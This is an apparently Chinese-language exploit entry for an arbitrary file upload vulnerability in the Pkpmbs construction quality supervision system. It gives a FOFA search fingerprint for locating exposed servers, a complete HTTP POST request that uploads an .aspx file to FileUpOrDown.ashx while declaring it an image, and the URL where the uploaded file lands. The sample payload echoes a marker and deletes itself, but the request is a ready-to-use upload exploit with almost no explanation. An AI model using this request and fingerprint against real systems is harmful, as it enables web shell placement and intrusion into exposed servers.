## Pkpmbs建设工程质量监督系统FileUpOrDown.ashx存在文件上传漏洞

## fofa
```
body="/Content/Theme/Standard/"
```

## poc
```
POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName=5B56bf.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Content-Length: 387
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
Accept-Encoding: gzip, deflate

------WebKitFormBoundarybqACRhAMBHmQQAUP
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png

e165421110ba03099a1c0393373c5b43
<%@ Page Language="C#" Debug="true" %>
<%@ import Namespace="System"%>
<%@ import Namespace="System.IO"%>
<% string pageName = Request.PhysicalPath;%>
<% File.Delete(pageName);%>
------WebKitFormBoundarybqACRhAMBHmQQAUP--
```

文件路径：http://ip/Excel/Templete/5B56bf.aspx

